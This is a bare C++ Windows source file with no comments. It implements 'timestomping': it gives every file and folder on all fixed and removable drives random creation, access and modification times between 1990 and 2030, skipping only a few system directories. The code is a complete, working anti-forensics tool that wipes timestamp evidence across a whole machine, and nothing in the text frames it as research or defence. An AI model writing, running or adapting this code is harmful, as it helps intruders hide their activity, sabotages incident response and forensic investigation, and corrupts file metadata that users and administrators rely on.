#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <random>

FILETIME GenerateRandomFileTime() {
    SYSTEMTIME stStart = {0};
    stStart.wYear = 1990; stStart.wMonth = 1; stStart.wDay = 1;
    FILETIME ftStart;
    SystemTimeToFileTime(&stStart, &ftStart);

    SYSTEMTIME stEnd = {0};
    stEnd.wYear = 2030; stEnd.wMonth = 12; stEnd.wDay = 31;
    stEnd.wHour = 23; stEnd.wMinute = 59; stEnd.wSecond = 59;
    FILETIME ftEnd;
    SystemTimeToFileTime(&stEnd, &ftEnd);

    ULARGE_INTEGER ulStart, ulEnd;
    ulStart.LowPart = ftStart.dwLowDateTime;
    ulStart.HighPart = ftStart.dwHighDateTime;
    ulEnd.LowPart = ftEnd.dwLowDateTime;
    ulEnd.HighPart = ftEnd.dwHighDateTime;

    std::random_device rd;
    std::mt19937_64 gen(rd());
    std::uniform_int_distribution<unsigned long long> dist(ulStart.QuadPart, ulEnd.QuadPart);
    ULARGE_INTEGER ulResult;
    ulResult.QuadPart = dist(gen);

    FILETIME ft;
    ft.dwLowDateTime = ulResult.LowPart;
    ft.dwHighDateTime = ulResult.HighPart;
    return ft;
}

bool SetRandomFileTimes(const std::string& path) {
    FILETIME ft = GenerateRandomFileTime();
    HANDLE hFile = CreateFileA(path.c_str(),
                               FILE_WRITE_ATTRIBUTES,
                               FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL,
                               OPEN_EXISTING,
                               FILE_FLAG_BACKUP_SEMANTICS,
                               NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }
    BOOL ok = SetFileTime(hFile, &ft, &ft, &ft);
    CloseHandle(hFile);
    return ok != 0;
}

void TimestompFolder(const std::string& folder, bool skipSystemDirs) {
    std::string searchPath = folder + "\\*";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        std::string name = findData.cFileName;
        if (name == "." || name == "..") continue;

        std::string fullPath = folder + "\\" + name;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
            continue;

        if (skipSystemDirs) {
            std::string lower = fullPath;
            for (auto& c : lower) c = tolower(c);
            if (lower.find("\\windows\\") != std::string::npos ||
                lower.find("\\program files\\") != std::string::npos ||
                lower.find("\\program files (x86)\\") != std::string::npos ||
                lower.find("\\system volume information\\") != std::string::npos ||
                lower.find("\\$recycle.bin\\") != std::string::npos) {
                continue;
            }
        }

        SetRandomFileTimes(fullPath);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            TimestompFolder(fullPath, skipSystemDirs);
        }
    } while (FindNextFileA(hFind, &findData) != 0);

    FindClose(hFind);
}

void TimestompAllAccessibleFiles(bool skipSystemDirs = true) {
    DWORD drives = GetLogicalDrives();
    if (drives == 0) {
        return;
    }

    char driveLetter = 'A';
    for (int i = 0; i < 26; ++i, ++driveLetter) {
        if (drives & (1 << i)) {
            std::string rootPath = std::string(1, driveLetter) + ":\\";
            UINT driveType = GetDriveTypeA(rootPath.c_str());
            if (driveType != DRIVE_FIXED && driveType != DRIVE_REMOVABLE)
                continue;

            TimestompFolder(rootPath, skipSystemDirs);
        }
    }
}